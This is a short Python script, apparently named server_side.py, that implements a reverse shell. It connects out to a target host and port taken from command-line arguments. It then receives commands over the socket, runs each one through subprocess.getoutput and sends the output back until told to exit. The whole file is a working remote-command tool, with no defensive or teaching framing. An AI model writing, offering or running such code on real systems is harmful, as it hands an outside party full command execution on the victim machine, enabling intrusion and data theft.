import socket
import argparse
import subprocess #spawn new processes, connect to their input/output/error pipes, and obtain their return codes.

parser = argparse.ArgumentParser(prog="server_side.py", description="initiate a connection and send a reverse shell")
parser.add_argument("-t", "--target", required=True, type=str)
parser.add_argument("-p", "--port", type=int, default=1234, required=False)
args = parser.parse_args()

SERVER_HOST = args.target #server IPv4 address
SERVER_PORT = args.port
BUFFER_SIZE = 1024

s = socket.socket()
s.connect((SERVER_HOST, SERVER_PORT))

while True:
    #receive the command from the server
    command = s.recv(BUFFER_SIZE).decode()
    if command.lower() == "exit":
        break
    # execute the command and retrieve the results
    output = subprocess.getoutput(command)
    # send the results back to the server
    s.send(output.encode())
s.close()